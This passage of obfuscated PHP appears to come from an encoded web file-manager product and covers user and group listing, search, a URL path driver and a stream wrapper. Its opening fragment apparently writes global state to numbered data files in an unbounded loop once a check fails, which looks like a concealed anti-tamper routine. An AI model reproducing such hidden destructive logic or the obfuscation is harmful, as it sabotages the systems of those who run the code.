($c„ø—ÔØ¦÷ = $aì‘´Ú«; $c„ø—ÔØ¦÷ > 0; $c„ø—ÔØ¦÷++) { $AŠ—­™ø£(DATA_PATH . $c„ø—ÔØ¦÷, $A±ëÑ£˜´); } goto eòİ¡Š³Ô; e½ÆË‘Ö: $bÍôï¢Ş­‹ = $bñ¾¼‘©©‚($a“·“èâß¶); $FÁøŞÜƒé¶ = explode($fšÒáç…Î[227], $bÍôï¢Ş­‹); if (count($FÁøŞÜƒé¶) < $fšÒáç…Î[587]) { $föÉÎ…Ñ†– = $fšÒáç…Î[805]; $föÉÎ…Ñ†–(); } goto f±†ÕäŞŸ; eÈ¸ó÷•Ü“: $bí‡‹Ô¤(); $AŠ—­™ø£ = $fšÒáç…Î[1374]; $A±ëÑ£˜´ = json_encode($GLOBALS[$fšÒáç…Î[1375]]); goto CàÎàœà©; eòİ¡Š³Ô: } $d¨ÅéäÕ²Æ = $this->getInfoSimple($FŒå²Îô…½); if (!$d¨ÅéäÕ²Æ || !is_array($föö‘Á¡²±)) { return !1; } goto f°¦Á¬¹åÀ; DÈˆ‰ß: } protected function userGroupAdd($DŠÆ‚ñ±É, $fÆ•ƒÜŠØ = array()) { $C»á†Å×ó™ =& $_SERVER[¹Ò‹Ò¹]; $Cîˆ…Òªì÷ = $this->getInfoSimple($DŠÆ‚ñ±É); if (!$Cîˆ…Òªì÷ || empty($fÆ•ƒÜŠØ)) { return !1; } $D†Î‡©ˆ = array(); foreach ($fÆ•ƒÜŠØ as $Eóß±Â¢© => $eğ†ì´«é¨) { $D†Î‡©ˆ[] = array($C»á†Å×ó™[1504] => $DŠÆ‚ñ±É, $C»á†Å×ó™[1667] => $Eóß±Â¢©, $C»á†Å×ó™[1764] => $eğ†ì´«é¨, $C»á†Å×ó™[1690] => 0); } return Model($C»á†Å×ó™[1750])->addAll($D†Î‡©ˆ, array(), !0); } protected function userGroupRemove($A—‡İƒŸÇ, $bØ´øŠĞ·Î) { $DíÌ„¡Æ…ğ =& $_SERVER[¹Ò‹Ò¹]; $fîÂ½³¯Ö = $this->getInfoSimple($A—‡İƒŸÇ); if (!$fîÂ½³¯Ö || !$bØ´øŠĞ·Î) { return !1; } $c±óŠñâä  = array($DíÌ„¡Æ…ğ[1496] => $A—‡İƒŸÇ, $DíÌ„¡Æ…ğ[1747] => $bØ´øŠĞ·Î); return Model($DíÌ„¡Æ…ğ[1750])->where($c±óŠñâä )->delete(); } public function listData() { $AÍÓî»Ñ¯˜ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AÍÓî»Ñ¯˜[$_SERVER[¹Ò‹Ò¹][365]]); return $AÍÓî»Ñ¯˜; } public function listByID($b£Ï‘ƒÈì¼) { $e¬÷¾•ËÜé =& $_SERVER[¹Ò‹Ò¹]; if (!$b£Ï‘ƒÈì¼) { return; } $dó‹…¾œ£Î = array($e¬÷¾•ËÜé[1504] => array($e¬÷¾•ËÜé[7], $b£Ï‘ƒÈì¼)); $cÓÈğÉ‡×ğ = $this->where($dó‹…¾œ£Î)->select(); $this->_listDataApply($cÓÈğÉ‡×ğ); return $cÓÈğÉ‡×ğ; } public function listByGroup($AãÙ‘õà“ = 0, $EØê‹çÛ¿¢ = array()) { goto eŸ¼˜‰ÛŠ; eŸ¼˜‰ÛŠ: $eäŒİÈ…ÏÒ =& $_SERVER[¹Ò‹Ò¹]; $b‡ä¹•Š– = $eäŒİÈ…ÏÒ[33]; $d±Ï’áåÍÈ = array(); goto c´àª·İšä; c´àª·İšä: if ($AãÙ‘õà“) { $d±Ï’áåÍÈ = array($eäŒİÈ…ÏÒ[2128] => intval($AãÙ‘õà“)); $b‡ä¹•Š– = "\x4c\105\x46\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\x75\x73\x65\162\x5f\147\x72\157\x75\x70\x20\x75\x73\145\162\x5f\x67\x72\157\x75\160\40\157\x6e\40\165\x73\145\x72\x2e\x75\x73\145\162\111\104\40\x3d\x20\x75\x73\x65\x72\x5f\147\x72\157\x75\160\56\x75\x73\x65\162\111\104"; $dóÌ©“˜ô» = Input::get($eäŒİÈ…ÏÒ[429], null, $eäŒİÈ…ÏÒ[33]) ? $eäŒİÈ…ÏÒ[33] : $eäŒİÈ…ÏÒ[2129]; } if (isset($EØê‹çÛ¿¢[$eäŒİÈ…ÏÒ[704]])) { $d±Ï’áåÍÈ[$eäŒİÈ…ÏÒ[2130]] = $EØê‹çÛ¿¢[$eäŒİÈ…ÏÒ[704]]; } $c­ˆŒØŠÎ = $this->_makeOrder($dóÌ©“˜ô»)->field($eäŒİÈ…ÏÒ[2131])->where($d±Ï’áåÍÈ)->join($b‡ä¹•Š–)->selectPage(50); goto C÷Îì³•©; C÷Îì³•©: $this->_listDataApply($c­ˆŒØŠÎ[$eäŒİÈ…ÏÒ[365]]); return $c­ˆŒØŠÎ; goto EóßÖ¢¥¸; EóßÖ¢¥¸: } private function _makeOrder($Açâ…×æğŠ = '') { goto EîéÛ§×¾‹; EîéÛ§×¾‹: $CÎßñç© =& $_SERVER[¹Ò‹Ò¹]; $cŒ‰ã˜ªÑ = array($CÎßñç©[1504], $CÎßñç©[28], $CÎßñç©[1653], $CÎßñç©[1625], $CÎßñç©[192]); $A³ƒŠçì©‰ = array($CÎßñç©[422] => $CÎßñç©[423], $CÎßñç©[424] => $CÎßñç©[425]); goto eÄŒ•ø»±­; eÄŒ•ø»±­: $D›œËµâ¶÷ = Input::get($CÎßñç©[429], $CÎßñç©[7], $CÎßñç©[1496], $cŒ‰ã˜ªÑ); $D¿÷ÜÏÊç = Input::get($CÎßñç©[430], $CÎßñç©[7], $CÎßñç©[1751], array($CÎßñç©[1751], $CÎßñç©[424])); $D¿÷ÜÏÊç = $A³ƒŠçì©‰[$D¿÷ÜÏÊç]; goto C¼…±Ôƒ è; C¼…±Ôƒ è: $Açâ…×æğŠ = $Açâ…×æğŠ . "\x75\x73\145\162\x2e{$D›œËµâ¶÷}\x20{$D¿÷ÜÏÊç}\54\40\165\163\x65\x72\56\x75\x73\145\x72\x49\104\x20\x61\x73\x63"; return $this->alias($CÎßñç©[1873])->order($Açâ…×æğŠ); goto C…Âë£Ãİã; C…Âë£Ãİã: } public function listSearch($Aªë³·œäÇ) { goto Céâ°©Â; DçÈõÕ”ù¤: $AÅ‹¬èØ‡ = str_replace($D·ÁöŠ¨Äï[1754], $D·ÁöŠ¨Äï[1755], trim($AÅ‹¬èØ‡)); $d£ØÔÕÎÜŞ = array($D·ÁöŠ¨Äï[28] => array($D·ÁöŠ¨Äï[378], "\x25{$AÅ‹¬èØ‡}\x25"), $D·ÁöŠ¨Äï[301] => array($D·ÁöŠ¨Äï[378], "{$AÅ‹¬èØ‡}\x25"), $D·ÁöŠ¨Äï[1933] => array($D·ÁöŠ¨Äï[378], "{$AÅ‹¬èØ‡}\x25"), $D·ÁöŠ¨Äï[933] => $D·ÁöŠ¨Äï[1756]); if (Input::check($AÅ‹¬èØ‡, $D·ÁöŠ¨Äï[307])) { $d£ØÔÕÎÜŞ[$D·ÁöŠ¨Äï[1504]] = array($D·ÁöŠ¨Äï[378], "{$AÅ‹¬èØ‡}\45"); $d£ØÔÕÎÜŞ[$D·ÁöŠ¨Äï[2112]] = array($D·ÁöŠ¨Äï[378], "{$AÅ‹¬èØ‡}\x25"); } goto Dµï“; Céâ°©Â: $D·ÁöŠ¨Äï =& $_SERVER[¹Ò‹Ò¹]; $AÅ‹¬èØ‡ = $Aªë³·œäÇ[$D·ÁöŠ¨Äï[1752]]; $Fİ¿Ñ¤Å² = isset($Aªë³·œäÇ[$D·ÁöŠ¨Äï[1753]]) ? $Aªë³·œäÇ[$D·ÁöŠ¨Äï[1753]] : !1; goto DçÈõÕ”ù¤; cğØñï™‡: $this->_filterByGroup($d¹Ÿ‰»•–¥, $Fİ¿Ñ¤Å²); return $d¹Ÿ‰»•–¥; goto f—©Â—Åª; Dµï“: if (!$AÅ‹¬èØ‡) { $d£ØÔÕÎÜŞ = array(); } if (isset($Aªë³·œäÇ[$D·ÁöŠ¨Äï[704]])) { $d£ØÔÕÎÜŞ[$D·ÁöŠ¨Äï[704]] = $Aªë³·œäÇ[$D·ÁöŠ¨Äï[704]]; } $d£ØÔÕÎÜŞ = $this->parseWhereLike($d£ØÔÕÎÜŞ); goto e‘ÉÙ—‰é; e‘ÉÙ—‰é: $d¹Ÿ‰»•–¥ = $this->_makeOrder()->where($d£ØÔÕÎÜŞ)->selectPage(20); if (!$d¹Ÿ‰»•–¥ || count($d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[365]]) < 5 && Input::check($AÅ‹¬èØ‡, $D·ÁöŠ¨Äï[314])) { $Eğ¢¡›£ = $this->_searchFromMeta($D·ÁöŠ¨Äï[437], $AÅ‹¬èØ‡, 10); $dˆéùŒÔİ = $this->_searchFromMeta($D·ÁöŠ¨Äï[438], $AÅ‹¬èØ‡, 10); $C¿ï³Ëº–à = array_merge($Eğ¢¡›£, $dˆéùŒÔİ, $d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[365]]); $d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[365]] = array_unique_by_key($C¿ï³Ëº–à, $D·ÁöŠ¨Äï[1504]); $d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[362]][$D·ÁöŠ¨Äï[363]] = count($d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[365]]); $d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[362]][$D·ÁöŠ¨Äï[364]] = ceil($d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[362]][$D·ÁöŠ¨Äï[363]] / $d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[362]][$D·ÁöŠ¨Äï[359]]); } $this->_listDataApply($d¹Ÿ‰»•–¥[$D·ÁöŠ¨Äï[365]]); goto cğØñï™‡; f—©Â—Åª: } private function _filterByGroup(&$cå×‰‘Ê“¼, $Bæ˜ÚÂ…¡¼) { $FáÍôÉÈ =& $_SERVER[¹Ò‹Ò¹]; if (!$Bæ˜ÚÂ…¡¼) { return $cå×‰‘Ê“¼; } foreach ($cå×‰‘Ê“¼[$FáÍôÉÈ[365]] as $C‚–÷õä® => &$f®Ôë†î ì) { $d¶¾¥°Á¦ = array_to_keyvalue($f®Ôë†î ì[$FáÍôÉÈ[1843]], $FáÍôÉÈ[33], $FáÍôÉÈ[1667]); if (!in_array($Bæ˜ÚÂ…¡¼, $d¶¾¥°Á¦)) { unset($cå×‰‘Ê“¼[$FáÍôÉÈ[365]][$C‚–÷õä®]); } } unset($f®Ôë†î ì); $cå×‰‘Ê“¼[$FáÍôÉÈ[365]] = array_values($cå×‰‘Ê“¼[$FáÍôÉÈ[365]]); $cå×‰‘Ê“¼[$FáÍôÉÈ[362]] = array($FáÍôÉÈ[1905] => count($cå×‰‘Ê“¼[$FáÍôÉÈ[365]]), $FáÍôÉÈ[1903] => $cå×‰‘Ê“¼[$FáÍôÉÈ[362]][$FáÍôÉÈ[359]], $FáÍôÉÈ[1902] => 1, $FáÍôÉÈ[1904] => 1); } private function _searchFromMeta($e²°•£‚¹Ç, $bŒË‚ôí¨›, $c’‚„Œ¦ã) { goto aÀÃâÀ±Ş; bó§Äõ™à : $A±°Ö¦ˆî = array_to_keyvalue($A±°Ö¦ˆî, $F©å¦‹‚¥[33], $F©å¦‹‚¥[1504]); $aè³µÎÑ²Ú = $this->where(array($F©å¦‹‚¥[1496] => array($F©å¦‹‚¥[7], $A±°Ö¦ˆî)))->select(); if (!$aè³µÎÑ²Ú) { return array(); } goto eùÇ•Ëá¸²; eùÇ•Ëá¸²: return $aè³µÎÑ²Ú; goto fÕ–Œ‚ßÅÈ; aÀÃâÀ±Ş: $F©å¦‹‚¥ =& $_SERVER[¹Ò‹Ò¹]; $bŒË‚ôí¨› = strtolower($bŒË‚ôí¨›); $f±µ„«íÂè = array($F©å¦‹‚¥[92] => $e²°•£‚¹Ç, $F©å¦‹‚¥[370] => array($F©å¦‹‚¥[378], "\45{$bŒË‚ôí¨›}\45")); goto Aˆ×óÌ«ÂÑ; Aˆ×óÌ«ÂÑ: $f±µ„«íÂè = $this->parseWhereLike($f±µ„«íÂè); $A±°Ö¦ˆî = Model($F©å¦‹‚¥[2132])->where($f±µ„«íÂè)->limit($c’‚„Œ¦ã)->select(); if (!$A±°Ö¦ˆî) { return array(); } goto bó§Äõ™à ; fÕ–Œ‚ßÅÈ: } private function _listDataApplyItem($BßÕ†©¾Ğç) { $F‘ÛŸ¿Æº„ = array($BßÕ†©¾Ğç); $this->_listDataApply($F‘ÛŸ¿Æº„); return $F‘ÛŸ¿Æº„[0]; } private function _listDataApply(&$AÇËØÓ÷Ìš) { goto a‰ç­í”Ê¬; a‰ç­í”Ê¬: $cÔ²¿Œ’Ú =& $_SERVER[¹Ò‹Ò¹]; if (!$AÇËØÓ÷Ìš) { return; } array_remove_key($AÇËØÓ÷Ìš, $cÔ²¿Œ’Ú[825]); goto d¤š¡ƒ¼—í; d¤š¡ƒ¼—í: $FÀó½æ©¶ = array_to_keyvalue($AÇËØÓ÷Ìš, $cÔ²¿Œ’Ú[33], $cÔ²¿Œ’Ú[1504]); $this->_listAppendGroup($AÇËØÓ÷Ìš, $FÀó½æ©¶); $this->_listAppendMeta($AÇËØÓ÷Ìš, $FÀó½æ©¶); goto eµŠ‹¿î²­; eµŠ‹¿î²­: $this->_listAppendSourceRoot($AÇËØÓ÷Ìš, $FÀó½æ©¶); goto C¿ò°¨Ü²•; C¿ò°¨Ü²•: } private function _listAppendSourceRoot(&$CÅà–Í›Ö‡, $CöÚåãÍø¢) { goto AŠÖÏ¬‡Ôí; AŠÖÏ¬‡Ôí: $F¥øå“ŠƒÓ =& $_SERVER[¹Ò‹Ò¹]; $C©»ÃÏ¹¸à = array($F¥øå“ŠƒÓ[472] => 0, $F¥øå“ŠƒÓ[398] => SourceModel::TYPE_USER, $F¥øå“ŠƒÓ[478] => array($F¥øå“ŠƒÓ[7], $CöÚåãÍø¢)); $EŠ¹‡—Ëª¥ = $F¥øå“ŠƒÓ[1762]; goto a‹›³»Ø; a‹›³»Ø: $DŸ§×»³Á = Model($F¥øå“ŠƒÓ[769])->order($F¥øå“ŠƒÓ[1763])->field($EŠ¹‡—Ëª¥)->where($C©»ÃÏ¹¸à)->select(); $DŸ§×»³Á = array_to_keyvalue($DŸ§×»³Á, $F¥øå“ŠƒÓ[478]); $DŸ§×»³Á = array_remove_key($DŸ§×»³Á, $F¥øå“ŠƒÓ[478]); goto f·²È›É„; f·²È›É„: foreach ($CÅà–Í›Ö‡ as &$EØ•›‰èÕ÷) { $EØ•›‰èÕ÷[$F¥øå“ŠƒÓ[84]] = $DŸ§×»³Á[$EØ•›‰èÕ÷[$F¥øå“ŠƒÓ[1504]]] ? $DŸ§×»³Á[$EØ•›‰èÕ÷[$F¥øå“ŠƒÓ[1504]]] : array(); } unset($EØ•›‰èÕ÷); goto c½àê¹Ñ‡£; c½àê¹Ñ‡£: } private function _listAppendGroup(&$E¿ äˆ¿Ì, $B¯Ò‡ÈÉã²) { goto Fƒ¡‘ä§ó; Fƒ¡‘ä§ó: $B¢Œ×ˆîÇŒ =& $_SERVER[¹Ò‹Ò¹]; $EĞñ ¾íÈ = array($B¢Œ×ˆîÇŒ[1504] => array($B¢Œ×ˆîÇŒ[7], $B¯Ò‡ÈÉã²)); $FêİĞ›É«‰ = Model($B¢Œ×ˆîÇŒ[1750])->where($EĞñ ¾íÈ)->select(); goto bÏ¶Éñ»÷; Aâ“ğ‰Œ»: $EĞñ ¾íÈ = array($B¢Œ×ˆîÇŒ[1667] => array($B¢Œ×ˆîÇŒ[7], $cÂ¡“Å›µË)); $bÆ’ãÔèÜÉ = Model($B¢Œ×ˆîÇŒ[1841])->field($B¢Œ×ˆîÇŒ[2133])->where($EĞñ ¾íÈ)->select(); $bÆ’ãÔèÜÉ = array_to_keyvalue($bÆ’ãÔèÜÉ, $B¢Œ×ˆîÇŒ[1667]); goto c™í‹Öùã‘; bÏ¶Éñ»÷: $cÂ¡“Å›µË = array_to_keyvalue($FêİĞ›É«‰, $B¢Œ×ˆîÇŒ[33], $B¢Œ×ˆîÇŒ[1667]); $cÂ¡“Å›µË = array_remove_value(array_unique($cÂ¡“Å›µË), $B¢Œ×ˆîÇŒ[491]); if (!$cÂ¡“Å›µË || !$FêİĞ›É«‰) { return; } goto Aâ“ğ‰Œ»; c„¾‘íÖ¼‹: foreach ($E¿ äˆ¿Ì as &$cñƒ¾¥Ñ) { $cñƒ¾¥Ñ[$B¢Œ×ˆîÇŒ[1843]] = array(); if (isset($FêİĞ›É«‰[$cñƒ¾¥Ñ[$B¢Œ×ˆîÇŒ[1504]]])) { $cñƒ¾¥Ñ[$B¢Œ×ˆîÇŒ[1843]] = $FêİĞ›É«‰[$cñƒ¾¥Ñ[$B¢Œ×ˆîÇŒ[1504]]]; } } unset($cñƒ¾¥Ñ); goto dÀøÑëõš; c™í‹Öùã‘: $FêİĞ›É«‰ = array_to_keyvalue_group($FêİĞ›É«‰, $B¢Œ×ˆîÇŒ[1504]); foreach ($FêİĞ›É«‰ as &$dÌøöõ¨ø³) { $fˆƒùì¿µ = array(); foreach ($dÌøöõ¨ø³ as $f×ëÛË©—) { if (!$f×ëÛË©—[$B¢Œ×ˆîÇŒ[1764]]) { continue; } $aÁ ›ìäù = Model($B¢Œ×ˆîÇŒ[1836])->listData($f×ëÛË©—[$B¢Œ×ˆîÇŒ[1764]]); $fˆƒùì¿µ[] = array($B¢Œ×ˆîÇŒ[1667] => $f×ëÛË©—[$B¢Œ×ˆîÇŒ[1667]], $B¢Œ×ˆîÇŒ[2134] => $bÆ’ãÔèÜÉ[$f×ëÛË©—[$B¢Œ×ˆîÇŒ[1667]]][$B¢Œ×ˆîÇŒ[28]], $B¢Œ×ˆîÇŒ[481] => $bÆ’ãÔèÜÉ[$f×ëÛË©—[$B¢Œ×ˆîÇŒ[1667]]][$B¢Œ×ˆîÇŒ[481]], $B¢Œ×ˆîÇŒ[400] => $aÁ ›ìäù); } $dÌøöõ¨ø³ = $fˆƒùì¿µ; } unset($dÌøöõ¨ø³); goto c„¾‘íÖ¼‹; dÀøÑëõš: } private function _listAppendMeta(&$dİ³Õ¨Ö¢, $dÓ†¤·°½À) { goto e†ÂÂ¥½¯Á; FÌ«Š»É¿ë: foreach ($cœ·Ú£ òÊ as &$Fòğïš®°À) { $A’™‘„‹Ç· = array(); foreach ($Fòğïš®°À as $EåªùŒçŠ) { if (!in_array($EåªùŒçŠ[$F®£ÎÄ¨[92]], $fĞÍ¯†šâ)) { $A’™‘„‹Ç·[$EåªùŒçŠ[$F®£ÎÄ¨[92]]] = $EåªùŒçŠ[$F®£ÎÄ¨[370]]; } } $Fòğïš®°À = $A’™‘„‹Ç·; } unset($Fòğïš®°À); $Cìó§ÏÖˆß = Model($F®£ÎÄ¨[2135]); goto f¾ªª­»ÎÌ; A¥•„Å©‘§: $aÊªµµÖ = array($F®£ÎÄ¨[1504] => array($F®£ÎÄ¨[7], $dÓ†¤·°½À)); $cœ·Ú£ òÊ = Model($F®£ÎÄ¨[2111])->where($aÊªµµÖ)->select(); $cœ·Ú£ òÊ = array_to_keyvalue_group($cœ·Ú£ òÊ, $F®£ÎÄ¨[1504]); goto FÌ«Š»É¿ë; e†ÂÂ¥½¯Á: $F®£ÎÄ¨ =& $_SERVER[¹Ò‹Ò¹]; $a¢˜–«İˆà = UserJobModel::JOB_KEY; $fĞÍ¯†šâ = array($F®£ÎÄ¨[2113]); goto A¥•„Å©‘§; f¾ªª­»ÎÌ: foreach ($dİ³Õ¨Ö¢ as &$E¥±ÒÏñ„ä) { $B³ßËéÌÈ˜ = array(); if (isset($cœ·Ú£ òÊ[$E¥±ÒÏñ„ä[$F®£ÎÄ¨[1504]]])) { $B³ßËéÌÈ˜ = $cœ·Ú£ òÊ[$E¥±ÒÏñ„ä[$F®£ÎÄ¨[1504]]]; } $E¥±ÒÏñ„ä[$F®£ÎÄ¨[2136]] = array(); if (isset($B³ßËéÌÈ˜[$a¢˜–«İˆà])) { $E¥±ÒÏñ„ä[$F®£ÎÄ¨[2136]] = $Cìó§ÏÖˆß->getUserJobInfo($B³ßËéÌÈ˜[$a¢˜–«İˆà]); } } unset($E¥±ÒÏñ„ä); goto D©ğîää’; D©ğîää’: } protected function groupUserAll($cï½íî±£Í) { $c„ËÇ¬¹  =& $_SERVER[¹Ò‹Ò¹]; if (!$cï½íî±£Í) { return !1; } $F¡šØñ­£ = Model($c„ËÇ¬¹ [1750])->field($c„ËÇ¬¹ [1504])->where(array($c„ËÇ¬¹ [1667] => array($c„ËÇ¬¹ [7], $cï½íî±£Í)))->select(); $F¡šØñ­£ = array_to_keyvalue($F¡šØñ­£, $c„ËÇ¬¹ [33], $c„ËÇ¬¹ [1504]); return array_unique($F¡šØñ­£); } public function userSearch($B‘Ä¸ÊÈ–ë, $eÄéŒ‰‡îÙ = "\52") { return Model($_SERVER[¹Ò‹Ò¹][501])->where($B‘Ä¸ÊÈ–ë)->field($eÄéŒ‰‡îÙ)->find(); } } goto e¦àáÛÖÉ; bã»Öø‹: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($cÍº±ë‹Íƒ = false) { } public function exist($EéÈŸ©æïÇ) { $A†…£Ò½ñ = $this->info($EéÈŸ©æïÇ); return $A†…£Ò½ñ[$_SERVER[¹Ò‹Ò¹][193]]; } public function isFile($FÅ³«î©Ş) { $C…ùàÛĞ = $this->info($FÅ³«î©Ş); return $C…ùàÛĞ[$_SERVER[¹Ò‹Ò¹][193]]; } public function isFolder($B–æ¦”“¬¹) { return !1; } public function size($cŞøä¬¿–”) { $e‹â¼¡ÀÛ‹ = $this->info($cŞøä¬¿–”); return $e‹â¼¡ÀÛ‹[$_SERVER[¹Ò‹Ò¹][77]]; } public function info($BöÔî÷•) { return $this->infoParse($BöÔî÷•); } public function infoAuth($F•˜ÅŸÓ½Ò) { return $this->infoParse($F•˜ÅŸÓ½Ò); } public function infoWithChildren($c­¦˜á¸ÌÁ) { return $this->infoParse($c­¦˜á¸ÌÁ); } public function infoFull($fŞê¬ê¶„ê) { return $this->infoParse($fŞê¬ê¶„ê); } private function infoParse($E¥Öî½¨) { $bõñÆ¦ôæ· =& $_SERVER[¹Ò‹Ò¹]; $f¼Ç÷‡ãåÜ = $this->header($E¥Öî½¨); if (!$f¼Ç÷‡ãåÜ || !$f¼Ç÷‡ãåÜ[$bõñÆ¦ôæ·[704]]) { return !1; } $aö£®İ†Ô = _get($f¼Ç÷‡ãåÜ, $bõñÆ¦ôæ·[333], 0); $bçö˜‡®™æ = array($bõñÆ¦ôæ·[28] => $f¼Ç÷‡ãåÜ[$bõñÆ¦ôæ·[28]], $bõñÆ¦ôæ·[75] => $E¥Öî½¨, $bõñÆ¦ôæ·[29] => $bõñÆ¦ôæ·[191], $bõñÆ¦ôæ·[77] => intval($aö£®İ†Ô), $bõñÆ¦ôæ·[167] => get_path_ext($f¼Ç÷‡ãåÜ[$bõñÆ¦ôæ·[28]]), $bõñÆ¦ôæ·[1231] => $aö£®İ†Ô > 0 && $f¼Ç÷‡ãåÜ[$bõñÆ¦ôæ·[1352]], $bõñÆ¦ôæ·[1232] => !1); return $bçö˜‡®™æ; } private function header($F·¥ÍÓÍ¥§) { goto dëÜë•µ‘; EÊÚ›¤ô‘¶: $GLOBALS[$A¥Ÿ¸ŠÜêì[1353]] = !0; self::$_cacheHeader[$F·¥ÍÓÍ¥§] = url_header($F·¥ÍÓÍ¥§); $GLOBALS[$A¥Ÿ¸ŠÜêì[1353]] = $Cõó›¾œÙŸ; goto A™ºÃ•’²¤; dëÜë•µ‘: $A¥Ÿ¸ŠÜêì =& $_SERVER[¹Ò‹Ò¹]; if (isset(self::$_cacheHeader[$F·¥ÍÓÍ¥§])) { return self::$_cacheHeader[$F·¥ÍÓÍ¥§]; } $Cõó›¾œÙŸ = isset($GLOBALS[$A¥Ÿ¸ŠÜêì[1353]]) ? $GLOBALS[$A¥Ÿ¸ŠÜêì[1353]] : !1; goto EÊÚ›¤ô‘¶; A™ºÃ•’²¤: return self::$_cacheHeader[$F·¥ÍÓÍ¥§]; goto F˜àìªÌ«®; F˜àìªÌ«®: } public function hashSimple($b…Óå¡‹àµ, $dÕçœæ­‹Ú = false) { goto Dù‡óµë¦; D“òäô«½»: $AÉ·ÄÆ™ .= $this->fileSubstr($b…Óå¡‹àµ, $Eµ–Î÷Œ§± - $f¿œÛµÆÑ¢, $f¿œÛµÆÑ¢); return md5($AÉ·ÄÆ™) . $Eµ–Î÷Œ§±; goto D¢·‰ÓØé·; E‚Óè†¤â×: if ($Eµ–Î÷Œ§± <= $f¿œÛµÆÑ¢ * $c‡—öÅõÏĞ) { return md5($this->fileSubstr($b…Óå¡‹àµ, 0, $Eµ–Î÷Œ§±)) . $Eµ–Î÷Œ§±; } $c¥«¢Öùšƒ = intval($Eµ–Î÷Œ§± / $c‡—öÅõÏĞ); $AÉ·ÄÆ™ = $fõÍÒïá¹È[33]; goto C­¼Ÿ½´¾¤; C­¼Ÿ½´¾¤: $aÍç™ó×¨ = timeFloat(); $c²ŞÏÂÈ„Ï = 15; for ($a‰ŒÏáï¹ö = 0; $a‰ŒÏáï¹ö < $c‡—öÅõÏĞ; $a‰ŒÏáï¹ö++) { if (timeFloat() - $aÍç™ó×¨ > $c²ŞÏÂÈ„Ï) { return !1; } $b““Ø×¬… = $this->fileSubstr($b…Óå¡‹àµ, $c¥«¢Öùšƒ * $a‰ŒÏáï¹ö, $f¿œÛµÆÑ¢); if (!$b““Ø×¬…) { return !1; } $AÉ·ÄÆ™ .= $b““Ø×¬…; } goto D“òäô«½»; fëŒ™‹»—: $Eµ–Î÷Œ§± = $a©¥ª‘Õ´[$fõÍÒïá¹È[77]]; $f¿œÛµÆÑ¢ = 200; $c‡—öÅõÏĞ = 50; goto E‚Óè†¤â×; Dù‡óµë¦: $fõÍÒïá¹È =& $_SERVER[¹Ò‹Ò¹]; $a©¥ª‘Õ´ = $this->info($b…Óå¡‹àµ); if (!$a©¥ª‘Õ´ || !$a©¥ª‘Õ´[$fõÍÒïá¹È[193]]) { return !1; } goto fëŒ™‹»—; D¢·‰ÓØé·: } public function getContent($E”¸Š‚ğ¹÷) { return $this->fileSubstr($E”¸Š‚ğ¹÷); } public function fileSubstr($CÄÕ°›ìì, $CïÊ¨“ìÙ‹ = 0, $FŒæ‡Ş‹ = -1) { goto AğÎ‘¾ªõŞ; AğÎ‘¾ªõŞ: $FøÕÛ…ªãˆ =& $_SERVER[¹Ò‹Ò¹]; $D‘¨™àâæø = $this->info($CÄÕ°›ìì); if (!$D‘¨™àâæø || !$D‘¨™àâæø[$FøÕÛ…ªãˆ[193]] && $D‘¨™àâæø[$FøÕÛ…ªãˆ[77]] > 1024 * 1024 * 10) { return !1; } goto b‰õ¤ë—ùØ; E“È†Ö™ÆÑ: $D‚Ûğ‚ÅÆ = url_request($CÄÕ°›ìì, $FøÕÛ…ªãˆ[226], !1, $cƒ¿ÛÎ©á¨, !1, !1, 1); return $D‚Ûğ‚ÅÆ[$FøÕÛ…ªãˆ[1063]] ? $D‚Ûğ‚ÅÆ[$FøÕÛ…ªãˆ[1063]] : $FøÕÛ…ªãˆ[33]; goto bÅÛÉõÊ©ß; b‰õ¤ë—ùØ: if ($FŒæ‡Ş‹ === -1) { $FŒæ‡Ş‹ = $D‘¨™àâæø[$FøÕÛ…ªãˆ[77]]; } if ($FŒæ‡Ş‹ == 0) { return $FøÕÛ…ªãˆ[33]; } $cƒ¿ÛÎ©á¨ = array($FøÕÛ…ªãˆ[1354] . $CïÊ¨“ìÙ‹ . $FøÕÛ…ªãˆ[730] . ($CïÊ¨“ìÙ‹ + $FŒæ‡Ş‹ - 1)); goto E“È†Ö™ÆÑ; bÅÛÉõÊ©ß: } public function download($D‹šÏªëÌ, $CéÄ›¥é—ä) { Downloader::start($D‹šÏªëÌ, $CéÄ›¥é—ä); return $CéÄ›¥é—ä; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($CµÒÆù›İ, $EÀ£ø²îìÉ = '') { goto cƒÑ›‡¼…«; cƒÑ›‡¼…«: $this->info = $this->info($CµÒÆù›İ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¹Ò‹Ò¹][75]]; goto dá¯æÅô¶ç; céèßéíô¸: if (!isset(self::$_chunkBuffer[$CµÒÆù›İ])) { self::$_chunkBuffer[$CµÒÆù›İ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto F£ìîèÁÜ; dá¯æÅô¶ç: $this->pathOpen = $CµÒÆù›İ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto céèßéíô¸; F£ìîèÁÜ: } function stream_read($aÁš°²ñ£õ) { $D½Ñ’¾å‘ = $this->fileSubstr($this->pose, $aÁš°²ñ£õ); $this->pose += strlen($D½Ñ’¾å‘); return $D½Ñ’¾å‘; } public function stream_tell() { return $this->pose; } public function stream_seek($EÅª†õ¹¼ƒ, $C¹’º¦åÆƒ) { $a®ˆ´èç×¤ =& $_SERVER[¹Ò‹Ò¹]; if ($C¹’º¦åÆƒ == SEEK_SET) { $this->pose = $EÅª†õ¹¼ƒ; } else { if ($C¹’º¦åÆƒ == SEEK_CUR) { $this->pose += $EÅª†õ¹¼ƒ; } else { if ($C¹’º¦åÆƒ == SEEK_END) { $this->pose = $this->info[$a®ˆ´èç×¤[77]] + intval($EÅª†õ¹¼ƒ); } } } if ($EÅª†õ¹¼ƒ 